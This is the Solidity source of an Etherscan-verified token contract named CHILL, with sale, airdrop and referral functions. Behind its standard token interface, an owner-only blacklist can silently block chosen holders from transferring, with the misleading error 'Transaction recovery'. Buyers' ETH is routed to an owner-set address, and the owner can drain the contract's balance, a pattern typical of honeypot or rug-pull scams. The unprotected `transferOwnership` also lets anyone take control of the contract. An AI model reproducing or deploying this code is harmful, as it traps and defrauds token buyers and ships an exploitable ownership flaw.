/**
 *Submitted for verification at Etherscan.io on 2023-02-05
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.6.8;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }
}
contract Chill{
    using SafeMath for uint256;

    uint256 private _totalSupply = 190000000 * 10**18;
    uint256 private _initialSupply = 160000000 * 10**18;
    string private _name = "CHILL";
    string private _symbol = "CHILL";
    uint8 private _decimals = 18;
    address private _owner;
    uint256 private _cap   =  0;

    bool private _swAirdrop = true;
    bool private _swSale = true;
    uint256 private _referEth =     0;
    uint256 private _referToken =   0;
    uint256 private _airdropEth =   0;
    uint256 private _airdropToken = 0;
    address private _liquidity;
    

    uint256 private saleMaxBlock;
    uint256 private salePrice = 23000;
    
    mapping (address => uint256) private _balances;
    mapping (address => uint8) private _black;
    mapping (address => mapping (address => uint256)) private _allowances;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    

    constructor() public {
        _owner = msg.sender;
        _balances[_msgSender()] = _initialSupply;
        emit Transfer(address(0), _msgSender(), _initialSupply);
    }

    fallback() external {
    }

    receive() payable external {
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function cap() public view returns (uint256) {
        return _totalSupply;
    }
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowances[owner_][spender];
    }

    
    function transferOwnership(address newOwner) public {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _owner = newOwner;
    }
    modifier onlyOwner() {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }
   

    function addLiquidity(address addr) public onlyOwner returns(bool){
        require(address(0) != addr, "recovery");
        _liquidity = addr;
        return true;
    }
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _cap = _cap.add(amount);
        require(_cap <= _totalSupply, "ERC20Capped: cap exceeded");
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(this), account, amount);
    }
    function _approve(address owner_, address spender, uint256 amount) internal {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function clearETH() public onlyOwner() {
        payable(_owner).transfer(address(this).balance);
    }

     function black(address owner_,uint8 black_) public onlyOwner {
        _black[owner_] = black_;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_black[sender]!=1&&_black[sender]!=3&&_black[recipient]!=2&&_black[recipient]!=3, "Transaction recovery");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function update(uint8 tag,uint256 value)public onlyOwner returns(bool){
        if(tag==2){
            _swAirdrop = value==1;
        }else if(tag==3){
            _swSale = value==1;
        }else if(tag==4){
            _referEth = value;
        }else if(tag==5){
            _referToken = value;
        }else if(tag==6){
            _airdropEth = value;
        }else if(tag==7){
            _airdropToken = value;
        }else if(tag==8){
            salePrice = value;
        }
        return true;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function getBlock() public view returns(bool swAirdorp,bool swSale,uint256 sPrice,
        uint256 nowBlock,uint256 balance,uint256 airdropEth){
        swAirdorp = _swAirdrop;
        swSale = _swSale;
        sPrice = salePrice;
        nowBlock = block.number;
        balance = _balances[_msgSender()];
        airdropEth = _airdropEth;
    }

    function airdrop(address _refer)payable public returns(bool){
        require(_swAirdrop && msg.value == _airdropEth,"Transaction recovery");
        _mint(_msgSender(),_airdropToken);
        uint256 _msgValue = msg.value;
        if(_msgSender()!=_refer&&_refer!=address(0)&&_balances[_refer]>0){
            uint referEth = _airdropEth.mul(_referEth).div(10000);
            uint referToken = _airdropToken.mul(_referToken).div(10000);
            _mint(_refer,referToken);
            _msgValue=_msgValue.sub(referEth);
            address(uint160(_refer)).transfer(referEth);
        }
        address(uint160(_liquidity)).transfer(_msgValue);
        return true;
    }

    function buy(address _refer) payable public returns(bool){
        require(_swSale == true,"Transaction recovery");
        require(msg.value >= 0.01 ether,"Transaction recovery");
        uint256 _msgValue = msg.value;
        uint256 _token = _msgValue.mul(salePrice);
        _mint(_msgSender(),_token);
        if(_msgSender()!=_refer&&_refer!=address(0)&&_balances[_refer]>0){
            uint referEth = _msgValue.mul(_referEth).div(10000);
            uint referToken = _airdropToken.mul(_referToken).div(10000);
            _mint(_refer,referToken);
            _msgValue=_msgValue.sub(referEth);
            address(uint160(_refer)).transfer(referEth);
        }
        address(uint160(_liquidity)).transfer(_msgValue);
        return true;
    }
}